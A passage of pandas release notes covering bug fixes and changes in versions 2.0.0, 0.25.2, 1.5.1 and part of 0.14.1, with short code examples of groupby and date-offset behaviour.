(:issue:`50982`)\n- Bug in :meth:`DataFrame.query` with ``engine=\"numexpr\"`` and column names are ``min`` or ``max`` would raise a ``TypeError`` (:issue:`50937`)\n- Bug in :meth:`DataFrame.min` and :meth:`DataFrame.max` with tz-aware data containing ``pd.NaT`` and ``axis=1`` would return incorrect results (:issue:`51242`)\n\nConversion\n^^^^^^^^^^\n- Bug in constructing :class:`Series` with ``int64`` dtype from a string list raising instead of casting (:issue:`44923`)\n- Bug in constructing :class:`Series` with masked dtype and boolean values with ``NA`` raising (:issue:`42137`)\n- Bug in :meth:`DataFrame.eval` incorrectly raising an ``AttributeError`` when there are negative values in function call (:issue:`46471`)\n- Bug in :meth:`Series.convert_dtypes` not converting dtype to nullable dtype when :class:`Series` contains ``NA`` and has dtype ``object`` (:issue:`48791`)\n- Bug where any :class:`ExtensionDtype` subclass with ``kind=\"M\"`` would be interpreted as a timezone type (:issue:`34986`)\n- Bug in :class:`.arrays.ArrowExtensionArray` that would raise ``NotImplementedError`` when passed a sequence of strings or binary (:issue:`49172`)\n- Bug in :meth:`Series.astype` raising ``pyarrow.ArrowInvalid`` when converting from a non-pyarrow string dtype to a pyarrow numeric type (:issue:`50430`)\n- Bug in :meth:`DataFrame.astype` modifying input array inplace when converting to ``string`` and ``copy=False`` (:issue:`51073`)\n- Bug in :meth:`Series.to_numpy` converting to NumPy array before applying ``na_value`` (:issue:`48951`)\n- Bug in :meth:`DataFrame.astype` not copying data when converting to pyarrow dtype (:issue:`50984`)\n- Bug in :func:`to_datetime` was not respecting ``exact`` argument when ``format`` was an ISO8601 format (:issue:`12649`)\n- Bug in :meth:`TimedeltaArray.astype` raising ``TypeError`` when converting to a pyarrow duration type (:issue:`49795`)\n- Bug in :meth:`DataFrame.eval` and :meth:`DataFrame.query` raising for extension array dtypes (:issue:`29618`, :issue:`50261`, :issue:`31913`)\n- Bug in :meth:`Series` not copying data when created from :class:`Index` and ``dtype`` is equal to ``dtype`` from :class:`Index` (:issue:`52008`)\n\nStrings\n^^^^^^^\n- Bug in :func:`pandas.api.types.is_string_dtype` that would not return ``True`` for :class:`StringDtype` or :class:`ArrowDtype` with ``pyarrow.string()`` (:issue:`15585`)\n- Bug in converting string dtypes to \"datetime64[ns]\" or \"timedelta64[ns]\" incorrectly raising ``TypeError`` (:issue:`36153`)\n- Bug in setting values in a string-dtype column with an array, mutating the array as side effect when it contains missing values (:issue:`51299`)\n\nInterval\n^^^^^^^^\n- Bug in :meth:`IntervalIndex.is_overlapping` incorrect output if interval has duplicate left boundaries (:issue:`49581`)\n- Bug in :meth:`Series.infer_objects` failing to infer :class:`IntervalDtype` for an object series of :class:`Interval` objects (:issue:`50090`)\n- Bug in :meth:`Series.shift` with :class:`IntervalDtype` and invalid null ``fill_value`` failing to raise ``TypeError`` (:issue:`51258`)\n\nIndexing\n^^^^^^^^\n- Bug in :meth:`DataFrame.__setitem__` raising when indexer is a :class:`DataFrame` with ``boolean`` dtype (:issue:`47125`)\n- Bug in :meth:`DataFrame.reindex` filling with wrong values when indexing columns and index for ``uint`` dtypes (:issue:`48184`)\n- Bug in :meth:`DataFrame.loc` when setting :class:`DataFrame` with different dtypes coercing values to single dtype (:issue:`50467`)\n- Bug in :meth:`DataFrame.sort_values` where ``None`` was not returned when ``by`` is empty list and ``inplace=True`` (:issue:`50643`)\n- Bug in :meth:`DataFrame.loc` coercing dtypes when setting values with a list indexer (:issue:`49159`)\n- Bug in :meth:`Series.loc` raising error for out of bounds end of slice indexer (:issue:`50161`)\n- Bug in :meth:`DataFrame.loc` raising ``ValueError`` with all ``False`` ``bool`` indexer and empty object (:issue:`51450`)\n- Bug in :meth:`DataFrame.loc` raising ``ValueError`` with ``bool`` indexer and :class:`MultiIndex` (:issue:`47687`)\n- Bug in :meth:`DataFrame.loc` raising ``IndexError`` when setting values for a pyarrow-backed column with a non-scalar indexer (:issue:`50085`)\n- Bug in :meth:`DataFrame.__getitem__`, :meth:`Series.__getitem__`, :meth:`DataFrame.__setitem__` and :meth:`Series.__setitem__`\n  when indexing on indexes with extension float dtypes (:class:`Float64` & :class:`Float64`) or complex dtypes using integers (:issue:`51053`)\n- Bug in :meth:`DataFrame.loc` modifying object when setting incompatible value with an empty indexer (:issue:`45981`)\n- Bug in :meth:`DataFrame.__setitem__` raising ``ValueError`` when right hand side is :class:`DataFrame` with :class:`MultiIndex` columns (:issue:`49121`)\n- Bug in :meth:`DataFrame.reindex` casting dtype to ``object`` when :class:`DataFrame` has single extension array column when re-indexing ``columns`` and ``index`` (:issue:`48190`)\n- Bug in :meth:`DataFrame.iloc` raising ``IndexError`` when indexer is a :class:`Series` with numeric extension array dtype (:issue:`49521`)\n- Bug in :func:`~DataFrame.describe` when formatting percentiles in the resulting index showed more decimals than needed (:issue:`46362`)\n- Bug in :meth:`DataFrame.compare` does not recognize differences when comparing ``NA`` with value in nullable dtypes (:issue:`48939`)\n- Bug in :meth:`Series.rename` with :class:`MultiIndex` losing extension array dtypes (:issue:`21055`)\n- Bug in :meth:`DataFrame.isetitem` coercing extension array dtypes in :class:`DataFrame` to object (:issue:`49922`)\n- Bug in :meth:`Series.__getitem__` returning corrupt object when selecting from an empty pyarrow backed object (:issue:`51734`)\n- Bug in :class:`BusinessHour` would cause creation of :class:`DatetimeIndex` to fail when no opening hour was included in the index (:issue:`49835`)\n\nMissing\n^^^^^^^\n- Bug in :meth:`Index.equals` raising ``TypeError`` when :class:`Index` consists of tuples that contain ``NA`` (:issue:`48446`)\n- Bug in :meth:`Series.map` caused incorrect result when data has NaNs and defaultdict mapping was used (:issue:`48813`)\n- Bug in :class:`NA` raising a ``TypeError`` instead of return :class:`NA` when performing a binary operation with a ``bytes`` object (:issue:`49108`)\n- Bug in :meth:`DataFrame.update` with ``overwrite=False`` raising ``TypeError`` when ``self`` has column with ``NaT`` values and column not present in ``other`` (:issue:`16713`)\n- Bug in :meth:`Series.replace` raising ``RecursionError`` when replacing value in object-dtype :class:`Series` containing ``NA`` (:issue:`47480`)\n- Bug in :meth:`Series.replace` raising ``RecursionError`` when replacing value in numeric :class:`Series` with ``NA`` (:issue:`50758`)\n\nMultiIndex\n^^^^^^^^^^\n- Bug in :meth:`MultiIndex.get_indexer` not matching ``NaN`` values (:issue:`29252`, :issue:`37222`, :issue:`38623`, :issue:`42883`, :issue:`43222`, :issue:`46173`, :issue:`48905`)\n- Bug in :meth:`MultiIndex.argsort` raising ``TypeError`` when index contains :attr:`NA` (:issue:`48495`)\n- Bug in :meth:`MultiIndex.difference` losing extension array dtype (:issue:`48606`)\n- Bug in :class:`MultiIndex.set_levels` raising ``IndexError`` when setting empty level (:issue:`48636`)\n- Bug in :meth:`MultiIndex.unique` losing extension array dtype (:issue:`48335`)\n- Bug in :meth:`MultiIndex.intersection` losing extension array (:issue:`48604`)\n- Bug in :meth:`MultiIndex.union` losing extension array (:issue:`48498`, :issue:`48505`, :issue:`48900`)\n- Bug in :meth:`MultiIndex.union` not sorting when sort=None and index contains missing values (:issue:`49010`)\n- Bug in :meth:`MultiIndex.append` not checking names for equality (:issue:`48288`)\n- Bug in :meth:`MultiIndex.symmetric_difference` losing extension array (:issue:`48607`)\n- Bug in :meth:`MultiIndex.join` losing dtypes when :class:`MultiIndex` has duplicates (:issue:`49830`)\n- Bug in :meth:`MultiIndex.putmask` losing extension array (:issue:`49830`)\n- Bug in :meth:`MultiIndex.value_counts` returning a :class:`Series` indexed by flat index of tuples instead of a :class:`MultiIndex` (:issue:`49558`)\n\nI/O\n^^^\n- Bug in :func:`read_sas` caused fragmentation of :class:`DataFrame` and raised :class:`.errors.PerformanceWarning` (:issue:`48595`)\n- Improved error message in :func:`read_excel` by including the offending sheet name when an exception is raised while reading a file (:issue:`48706`)\n- Bug when a pickling a subset PyArrow-backed data that would serialize the entire data instead of the subset (:issue:`42600`)\n- Bug in :func:`read_sql_query` ignoring ``dtype`` argument when ``chunksize`` is specified and result is empty (:issue:`50245`)\n- Bug in :func:`read_csv` for a single-line csv with fewer columns than ``names`` raised :class:`.errors.ParserError` with ``engine=\"c\"`` (:issue:`47566`)\n- Bug in :func:`read_json` raising with ``orient=\"table\"`` and ``NA`` value (:issue:`40255`)\n- Bug in displaying ``string`` dtypes not showing storage option (:issue:`50099`)\n- Bug in :meth:`DataFrame.to_string` with ``header=False`` that printed the index name on the same line as the first row of the data (:issue:`49230`)\n- Bug in :meth:`DataFrame.to_string` ignoring float formatter for extension arrays (:issue:`39336`)\n- Fixed memory leak which stemmed from the initialization of the internal JSON module (:issue:`49222`)\n- Fixed issue where :func:`json_normalize` would incorrectly remove leading characters from column names that matched the ``sep`` argument (:issue:`49861`)\n- Bug in :func:`read_csv` unnecessarily overflowing for extension array dtype when containing ``NA`` (:issue:`32134`)\n- Bug in :meth:`DataFrame.to_dict` not converting ``NA`` to ``None`` (:issue:`50795`)\n- Bug in :meth:`DataFrame.to_json` where it would segfault when failing to encode a string (:issue:`50307`)\n- Bug in :meth:`DataFrame.to_html` with ``na_rep`` set when the :class:`DataFrame` contains non-scalar data (:issue:`47103`)\n- Bug in :func:`read_xml` where file-like objects failed when iterparse is used (:issue:`50641`)\n- Bug in :func:`read_csv` when ``engine=\"pyarrow\"`` where ``encoding`` parameter was not handled correctly (:issue:`51302`)\n- Bug in :func:`read_xml` ignored repeated elements when iterparse is used (:issue:`51183`)\n- Bug in :class:`ExcelWriter` leaving file handles open if an exception occurred during instantiation (:issue:`51443`)\n- Bug in :meth:`DataFrame.to_parquet` where non-string index or columns were raising a ``ValueError`` when ``engine=\"pyarrow\"`` (:issue:`52036`)\n\nPeriod\n^^^^^^\n- Bug in :meth:`Period.strftime` and :meth:`PeriodIndex.strftime`, raising ``UnicodeDecodeError`` when a locale-specific directive was passed (:issue:`46319`)\n- Bug in adding a :class:`Period` object to an array of :class:`DateOffset` objects incorrectly raising ``TypeError`` (:issue:`50162`)\n- Bug in :class:`Period` where passing a string with finer resolution than nanosecond would result in a ``KeyError`` instead of dropping the extra precision (:issue:`50417`)\n- Bug in parsing strings representing Week-periods e.g. \"2017-01-23/2017-01-29\" as minute-frequency instead of week-frequency (:issue:`50803`)\n- Bug in :meth:`.DataFrameGroupBy.sum`, :meth:`.DataFrameGroupByGroupBy.cumsum`, :meth:`.DataFrameGroupByGroupBy.prod`, :meth:`.DataFrameGroupByGroupBy.cumprod` with :class:`PeriodDtype` failing to raise ``TypeError`` (:issue:`51040`)\n- Bug in parsing empty string with :class:`Period` incorrectly raising ``ValueError`` instead of returning ``NaT`` (:issue:`51349`)\n\nPlotting\n^^^^^^^^\n- Bug in :meth:`DataFrame.plot.hist`, not dropping elements of ``weights`` corresponding to ``NaN`` values in ``data`` (:issue:`48884`)\n- ``ax.set_xlim`` was sometimes raising ``UserWarning`` which users couldn't address due to ``set_xlim`` not accepting parsing arguments - the converter now uses :func:`Timestamp` instead (:issue:`49148`)\n\nGroupby/resample/rolling\n^^^^^^^^^^^^^^^^^^^^^^^^\n- Bug in :class:`.ExponentialMovingWindow` with ``online`` not raising a ``NotImplementedError`` for unsupported operations (:issue:`48834`)\n- Bug in :meth:`.DataFrameGroupBy.sample` raises ``ValueError`` when the object is empty (:issue:`48459`)\n- Bug in :meth:`Series.groupby` raises ``ValueError`` when an entry of the index is equal to the name of the index (:issue:`48567`)\n- Bug in :meth:`.DataFrameGroupBy.resample` produces inconsistent results when passing empty DataFrame (:issue:`47705`)\n- Bug in :class:`.DataFrameGroupBy` and :class:`.SeriesGroupBy` would not include unobserved categories in result when grouping by categorical indexes (:issue:`49354`)\n- Bug in :class:`.DataFrameGroupBy` and :class:`.SeriesGroupBy` would change result order depending on the input index when grouping by categoricals (:issue:`49223`)\n- Bug in :class:`.DataFrameGroupBy` and :class:`.SeriesGroupBy` when grouping on categorical data would sort result values even when used with ``sort=False`` (:issue:`42482`)\n- Bug in :meth:`.DataFrameGroupBy.apply` and :class:`.SeriesGroupBy.apply` with ``as_index=False`` would not attempt the computation without using the grouping keys when using them failed with a ``TypeError`` (:issue:`49256`)\n- Bug in :meth:`.DataFrameGroupBy.describe` would describe the group keys (:issue:`49256`)\n- Bug in :meth:`.SeriesGroupBy.describe` with ``as_index=False`` would have the incorrect shape (:issue:`49256`)\n- Bug in :class:`.DataFrameGroupBy` and :class:`.SeriesGroupBy` with ``dropna=False`` would drop NA values when the grouper was categorical (:issue:`36327`)\n- Bug in :meth:`.SeriesGroupBy.nunique` would incorrectly raise when the grouper was an empty categorical and ``observed=True`` (:issue:`21334`)\n- Bug in :meth:`.SeriesGroupBy.nth` would raise when grouper contained NA values after subsetting from a :class:`DataFrameGroupBy` (:issue:`26454`)\n- Bug in :meth:`DataFrame.groupby` would not include a :class:`.Grouper` specified by ``key`` in the result when ``as_index=False`` (:issue:`50413`)\n- Bug in :meth:`.DataFrameGroupBy.value_counts` would raise when used with a :class:`.TimeGrouper` (:issue:`50486`)\n- Bug in :meth:`.Resampler.size` caused a wide :class:`DataFrame` to be returned instead of a :class:`Series` with :class:`MultiIndex` (:issue:`46826`)\n- Bug in :meth:`.DataFrameGroupBy.transform` and :meth:`.SeriesGroupBy.transform` would raise incorrectly when grouper had ``axis=1`` for ``\"idxmin\"`` and ``\"idxmax\"`` arguments (:issue:`45986`)\n- Bug in :class:`.DataFrameGroupBy` would raise when used with an empty DataFrame, categorical grouper, and ``dropna=False`` (:issue:`50634`)\n- Bug in :meth:`.SeriesGroupBy.value_counts` did not respect ``sort=False`` (:issue:`50482`)\n- Bug in :meth:`.DataFrameGroupBy.resample` raises ``KeyError`` when getting the result from a key list when resampling on time index (:issue:`50840`)\n- Bug in :meth:`.DataFrameGroupBy.transform` and :meth:`.SeriesGroupBy.transform` would raise incorrectly when grouper had ``axis=1`` for ``\"ngroup\"`` argument (:issue:`45986`)\n- Bug in :meth:`.DataFrameGroupBy.describe` produced incorrect results when data had duplicate columns (:issue:`50806`)\n- Bug in :meth:`.DataFrameGroupBy.agg` with ``engine=\"numba\"`` failing to respect ``as_index=False`` (:issue:`51228`)\n- Bug in :meth:`.DataFrameGroupBy.agg`, :meth:`.SeriesGroupBy.agg`, and :meth:`.Resampler.agg` would ignore arguments when passed a list of functions (:issue:`50863`)\n- Bug in :meth:`.DataFrameGroupBy.ohlc` ignoring ``as_index=False`` (:issue:`51413`)\n- Bug in :meth:`DataFrameGroupBy.agg` after subsetting columns (e.g. ``.groupby(...)[[\"a\", \"b\"]]``) would not include groupings in the result (:issue:`51186`)\n\nReshaping\n^^^^^^^^^\n- Bug in :meth:`DataFrame.pivot_table` raising ``TypeError`` for nullable dtype and ``margins=True`` (:issue:`48681`)\n- Bug in :meth:`DataFrame.unstack` and :meth:`Series.unstack` unstacking wrong level of :class:`MultiIndex` when :class:`MultiIndex` has mixed names (:issue:`48763`)\n- Bug in :meth:`DataFrame.melt` losing extension array dtype (:issue:`41570`)\n- Bug in :meth:`DataFrame.pivot` not respecting ``None`` as column name (:issue:`48293`)\n- Bug in :meth:`DataFrame.join` when ``left_on`` or ``right_on`` is or includes a :class:`CategoricalIndex` incorrectly raising ``AttributeError`` (:issue:`48464`)\n- Bug in :meth:`DataFrame.pivot_table` raising ``ValueError`` with parameter ``margins=True`` when result is an empty :class:`DataFrame` (:issue:`49240`)\n- Clarified error message in :func:`merge` when passing invalid ``validate`` option (:issue:`49417`)\n- Bug in :meth:`DataFrame.explode` raising ``ValueError`` on multiple columns with ``NaN`` values or empty lists (:issue:`46084`)\n- Bug in :meth:`DataFrame.transpose` with ``IntervalDtype`` column with ``timedelta64[ns]`` endpoints (:issue:`44917`)\n- Bug in :meth:`DataFrame.agg` and :meth:`Series.agg` would ignore arguments when passed a list of functions (:issue:`50863`)\n\nSparse\n^^^^^^\n- Bug in :meth:`Series.astype` when converting a ``SparseDtype`` with ``datetime64[ns]`` subtype to ``int64`` dtype raising, inconsistent with the non-sparse behavior (:issue:`49631`,:issue:`50087`)\n- Bug in :meth:`Series.astype` when converting a from ``datetime64[ns]`` to ``Sparse[datetime64[ns]]`` incorrectly raising (:issue:`50082`)\n- Bug in :meth:`Series.sparse.to_coo` raising ``SystemError`` when :class:`MultiIndex` contains a ``ExtensionArray`` (:issue:`50996`)\n\nExtensionArray\n^^^^^^^^^^^^^^\n- Bug in :meth:`Series.mean` overflowing unnecessarily with nullable integers (:issue:`48378`)\n- Bug in :meth:`Series.tolist` for nullable dtypes returning numpy scalars instead of python scalars (:issue:`49890`)\n- Bug in :meth:`Series.round` for pyarrow-backed dtypes raising ``AttributeError`` (:issue:`50437`)\n- Bug when concatenating an empty DataFrame with an ExtensionDtype to another DataFrame with the same ExtensionDtype, the resulting dtype turned into object (:issue:`48510`)\n- Bug in :meth:`array.PandasArray.to_numpy` raising with ``NA`` value when ``na_value`` is specified (:issue:`40638`)\n- Bug in :meth:`api.types.is_numeric_dtype` where a custom :class:`ExtensionDtype` would not return ``True`` if ``_is_numeric`` returned ``True`` (:issue:`50563`)\n- Bug in :meth:`api.types.is_integer_dtype`, :meth:`api.types.is_unsigned_integer_dtype`, :meth:`api.types.is_signed_integer_dtype`, :meth:`api.types.is_float_dtype` where a custom :class:`ExtensionDtype` would not return ``True`` if ``kind`` returned the corresponding NumPy type (:issue:`50667`)\n- Bug in :class:`Series` constructor unnecessarily overflowing for nullable unsigned integer dtypes (:issue:`38798`, :issue:`25880`)\n- Bug in setting non-string value into ``StringArray`` raising ``ValueError`` instead of ``TypeError`` (:issue:`49632`)\n- Bug in :meth:`DataFrame.reindex` not honoring the default ``copy=True`` keyword in case of columns with ExtensionDtype (and as a result also selecting multiple columns with getitem (``[]``) didn't correctly result in a copy) (:issue:`51197`)\n- Bug in :class:`~arrays.ArrowExtensionArray` logical operations ``&`` and ``|`` raising ``KeyError`` (:issue:`51688`)\n\nStyler\n^^^^^^\n- Fix :meth:`~pandas.io.formats.style.Styler.background_gradient` for nullable dtype :class:`Series` with ``NA`` values (:issue:`50712`)\n\nMetadata\n^^^^^^^^\n- Fixed metadata propagation in :meth:`DataFrame.corr` and :meth:`DataFrame.cov` (:issue:`28283`)\n\nOther\n^^^^^\n- Bug in incorrectly accepting dtype strings containing \"[pyarrow]\" more than once (:issue:`51548`)\n- Bug in :meth:`Series.searchsorted` inconsistent behavior when accepting :class:`DataFrame` as parameter ``value`` (:issue:`49620`)\n- Bug in :func:`array` failing to raise on :class:`DataFrame` inputs (:issue:`51167`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_200.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.5.0rc0..v2.0.0\n\n\n.. _whatsnew_0252:\n\nWhat's new in 0.25.2 (October 15, 2019)\n---------------------------------------\n\nThese are the changes in pandas 0.25.2. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n.. note::\n\n    pandas 0.25.2 adds compatibility for Python 3.8 (:issue:`28147`).\n\n.. _whatsnew_0252.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\nIndexing\n^^^^^^^^\n\n- Fix regression in :meth:`DataFrame.reindex` not following the ``limit`` argument (:issue:`28631`).\n- Fix regression in :meth:`RangeIndex.get_indexer` for decreasing :class:`RangeIndex` where target values may be improperly identified as missing/present (:issue:`28678`)\n\nIO\n^^\n\n- Fix regression in notebook display where ``<th>`` tags were missing for :attr:`DataFrame.index` values (:issue:`28204`).\n- Regression in :meth:`~DataFrame.to_csv` where writing a :class:`Series` or :class:`DataFrame` indexed by an :class:`IntervalIndex` would incorrectly raise a ``TypeError`` (:issue:`28210`)\n- Fix :meth:`~DataFrame.to_csv` with ``ExtensionArray`` with list-like values (:issue:`28840`).\n\nGroupBy/resample/rolling\n^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Bug incorrectly raising an ``IndexError`` when passing a list of quantiles to :meth:`.DataFrameGroupBy.quantile` (:issue:`28113`).\n- Bug in :meth:`.GroupBy.shift`, :meth:`.GroupBy.bfill` and :meth:`.GroupBy.ffill` where timezone information would be dropped (:issue:`19995`, :issue:`27992`)\n\nOther\n^^^^^\n\n- Compatibility with Python 3.8 in :meth:`DataFrame.query` (:issue:`27261`)\n- Fix to ensure that tab-completion in an IPython console does not raise\n  warnings for deprecated attributes (:issue:`27900`).\n\n.. _whatsnew_0.252.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.25.1..v0.25.2\n\n\n.. _whatsnew_151:\n\nWhat's new in 1.5.1 (October 19, 2022)\n--------------------------------------\n\nThese are the changes in pandas 1.5.1. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_151.groupby_categorical_regr:\n\nBehavior of ``groupby`` with categorical groupers (:issue:`48645`)\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIn versions of pandas prior to 1.5, ``groupby`` with ``dropna=False`` would still drop\nNA values when the grouper was a categorical dtype. A fix for this was attempted in\n1.5, however it introduced a regression where passing ``observed=False`` and\n``dropna=False`` to ``groupby`` would result in only observed categories. It was found\nthat the patch fixing the ``dropna=False`` bug is incompatible with ``observed=False``,\nand decided that the best resolution is to restore the correct ``observed=False``\nbehavior at the cost of reintroducing the ``dropna=False`` bug.\n\n.. ipython:: python\n\n   df = pd.DataFrame(\n       {\n           \"x\": pd.Categorical([1, None], categories=[1, 2, 3]),\n           \"y\": [3, 4],\n       }\n   )\n   df\n\n*1.5.0 behavior*:\n\n.. code-block:: ipython\n\n   In [3]:  Correct behavior, NA values are not dropped\n           df.groupby(\"x\", observed=True, dropna=False).sum()\n   Out[3]:\n        y\n   x\n   1    3\n   NaN  4\n\n\n   In [4]:  Incorrect behavior, only observed categories present\n           df.groupby(\"x\", observed=False, dropna=False).sum()\n   Out[4]:\n        y\n   x\n   1    3\n   NaN  4\n\n\n*1.5.1 behavior*:\n\n.. ipython:: python\n\n    Incorrect behavior, NA values are dropped\n   df.groupby(\"x\", observed=True, dropna=False).sum()\n\n    Correct behavior, unobserved categories present (NA values still dropped)\n   df.groupby(\"x\", observed=False, dropna=False).sum()\n\n.. _whatsnew_151.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed Regression in :meth:`Series.__setitem__` casting ``None`` to ``NaN`` for object dtype (:issue:`48665`)\n- Fixed Regression in :meth:`DataFrame.loc` when setting values as a :class:`DataFrame` with all ``True`` indexer (:issue:`48701`)\n- Regression in :func:`.read_csv` causing an ``EmptyDataError`` when using an UTF-8 file handle that was already read from (:issue:`48646`)\n- Regression in :func:`to_datetime` when ``utc=True`` and ``arg`` contained timezone naive and aware arguments raised a ``ValueError`` (:issue:`48678`)\n- Fixed regression in :meth:`DataFrame.loc` raising ``FutureWarning`` when setting an empty :class:`DataFrame` (:issue:`48480`)\n- Fixed regression in :meth:`DataFrame.describe` raising ``TypeError`` when result contains ``NA`` (:issue:`48778`)\n- Fixed regression in :meth:`DataFrame.plot` ignoring invalid ``colormap`` for ``kind=\"scatter\"`` (:issue:`48726`)\n- Fixed regression in :meth:`MultiIndex.values` resetting ``freq`` attribute of underlying :class:`Index` object (:issue:`49054`)\n- Fixed performance regression in :func:`factorize` when ``na_sentinel`` is not ``None`` and ``sort=False`` (:issue:`48620`)\n- Fixed regression causing an ``AttributeError`` during warning emitted if the provided table name in :meth:`DataFrame.to_sql` and the table name actually used in the database do not match (:issue:`48733`)\n- Fixed regression in :func:`to_datetime` when ``arg`` was a date string with nanosecond and ``format`` contained ``%f`` would raise a ``ValueError`` (:issue:`48767`)\n- Fixed regression in :func:`testing.assert_frame_equal` raising for :class:`MultiIndex` with :class:`Categorical` and ``check_like=True`` (:issue:`48975`)\n- Fixed regression in :meth:`DataFrame.fillna` replacing wrong values for ``datetime64[ns]`` dtype and ``inplace=True`` (:issue:`48863`)\n- Fixed :meth:`.DataFrameGroupBy.size` not returning a Series when ``axis=1`` (:issue:`48738`)\n- Fixed Regression in :meth:`.DataFrameGroupBy.apply` when user defined function is called on an empty dataframe (:issue:`47985`)\n- Fixed regression in :meth:`DataFrame.apply` when passing non-zero ``axis`` via keyword argument (:issue:`48656`)\n- Fixed regression in :meth:`Series.groupby` and :meth:`DataFrame.groupby` when the grouper is a nullable data type (e.g. :class:`Int64`) or a PyArrow-backed string array, contains null values, and ``dropna=False`` (:issue:`48794`)\n- Fixed performance regression in :meth:`Series.isin` with mismatching dtypes (:issue:`49162`)\n- Fixed regression in :meth:`DataFrame.to_parquet` raising when file name was specified as ``bytes`` (:issue:`48944`)\n- Fixed regression in :class:`ExcelWriter` where the ``book`` attribute could no longer be set; however setting this attribute is now deprecated and this ability will be removed in a future version of pandas (:issue:`48780`)\n- Fixed regression in :meth:`DataFrame.corrwith` when computing correlation on tied data with ``method=\"spearman\"`` (:issue:`48826`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_151.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug in :meth:`Series.__getitem__` not falling back to positional for integer keys and boolean :class:`Index` (:issue:`48653`)\n- Bug in :meth:`DataFrame.to_hdf` raising ``AssertionError`` with boolean index (:issue:`48667`)\n- Bug in :func:`testing.assert_index_equal` for extension arrays with non matching ``NA`` raising ``ValueError`` (:issue:`48608`)\n- Bug in :meth:`DataFrame.pivot_table` raising unexpected ``FutureWarning`` when setting datetime column as index (:issue:`48683`)\n- Bug in :meth:`DataFrame.sort_values` emitting unnecessary ``FutureWarning`` when called on :class:`DataFrame` with boolean sparse columns (:issue:`48784`)\n- Bug in :class:`.arrays.ArrowExtensionArray` with a comparison operator to an invalid object would not raise a ``NotImplementedError`` (:issue:`48833`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_151.other:\n\nOther\n~~~~~\n- Avoid showing deprecated signatures when introspecting functions with warnings about arguments becoming keyword-only (:issue:`48692`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_151.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.5.0..v1.5.1\n\n\n.. _whatsnew_0141:\n\nVersion 0.14.1 (July 11, 2014)\n------------------------------\n\n{{ header }}\n\n\nThis is a minor release from 0.14.0 and includes a small number of API changes, several new features,\nenhancements, and performance improvements along with a large number of bug fixes. We recommend that all\nusers upgrade to this version.\n\n- Highlights include:\n\n  - New methods :meth:`~pandas.DataFrame.select_dtypes` to select columns\n    based on the dtype and :meth:`~pandas.Series.sem` to calculate the\n    standard error of the mean.\n  - Support for dateutil timezones (see :ref:`docs <timeseries.timezone>`).\n  - Support for ignoring full line comments in the :func:`~pandas.read_csv`\n    text parser.\n  - New documentation section on :ref:`Options and Settings <options>`.\n  - Lots of bug fixes.\n\n- :ref:`Enhancements <whatsnew_0141.enhancements>`\n- :ref:`API Changes <whatsnew_0141.api>`\n- :ref:`Performance Improvements <whatsnew_0141.performance>`\n- :ref:`Experimental Changes <whatsnew_0141.experimental>`\n- :ref:`Bug Fixes <whatsnew_0141.bug_fixes>`\n\n.. _whatsnew_0141.api:\n\nAPI changes\n~~~~~~~~~~~\n\n- Openpyxl now raises a ValueError on construction of the openpyxl writer\n  instead of warning on pandas import (:issue:`7284`).\n\n- For ``StringMethods.extract``, when no match is found, the result - only\n  containing ``NaN`` values - now also has ``dtype=object`` instead of\n  ``float`` (:issue:`7242`)\n\n- ``Period`` objects no longer raise a ``TypeError`` when compared using ``==``\n  with another object that *isn't* a ``Period``. Instead\n  when comparing a ``Period`` with another object using ``==`` if the other\n  object isn't a ``Period`` ``False`` is returned. (:issue:`7376`)\n\n- Previously, the behaviour on resetting the time or not in\n  ``offsets.apply``, ``rollforward`` and ``rollback`` operations differed\n  between offsets. With the support of the ``normalize`` keyword for all offsets(see\n  below) with a default value of False (preserve time), the behaviour changed for certain\n  offsets (BusinessMonthBegin, MonthEnd, BusinessMonthEnd, CustomBusinessMonthEnd,\n  BusinessYearBegin, LastWeekOfMonth, FY5253Quarter, LastWeekOfMonth, Easter):\n\n  .. code-block:: ipython\n\n    In [6]: from pandas.tseries import offsets\n\n    In [7]: d = pd.Timestamp('2014-01-01 09:00')\n\n     old behaviour < 0.14.1\n    In [8]: d + offsets.MonthEnd()\n    Out[8]: pd.Timestamp('2014-01-31 00:00:00')\n\n  Starting from 0.14.1 all offsets preserve time by default. The old\n  behaviour can be obtained with ``normalize=True``\n\n  .. ipython:: python\n     :suppress:\n\n     import pandas.tseries.offsets as offsets\n\n     d = pd.Timestamp(\"2014-01-01 09:00\")\n\n  .. ipython:: python\n\n      new behaviour\n     d + offsets.MonthEnd()\n     d + offsets.MonthEnd(normalize=True)\n\n  Note that for the other offsets the default behaviour did not change.\n\n- Add back ``N/A N/A`` as a default NA value in text parsing, (regression from 0.12) (:issue:`5521`)\n- Raise a ``TypeError`` on inplace-setting with a ``.where`` and a non ``np.nan`` value as this is inconsistent\n  with a set-item expression like ``df[mask] = None`` (:issue:`7656`)\n\n\n.. _whatsnew_0141.enhancements:\n\nEnhancements\n~~~~~~~~~~~~\n\n- Add ``dropna`` argument to ``value_counts`` and ``nunique`` (:issue:`5569`).\n- Add :meth:`~pandas.DataFrame.select_dtypes` method to allow selection of\n  columns based on dtype (:issue:`7316`). See :ref:`the docs <basics.selectdtypes>`.\n- All ``offsets`` supports the ``normalize`` keyword to specify whether\n  ``offsets.apply``, ``rollforward`` and ``rollback`` resets the time (hour,\n  minute, etc) or not (default ``False``, preserves time) (:issue:`7156`):\n\n  .. code-block:: python\n\n     import pandas.tseries.offsets as offsets\n\n     day = offsets.Day()\n     day.apply(pd.Timestamp(\"2014-01-01 09:00\"))\n\n     day = offsets.Day(normalize=True)\n     day.apply(pd.Timestamp(\"2014-01-01 09:00\"))\n\n- ``PeriodIndex`` is represented as the same format as 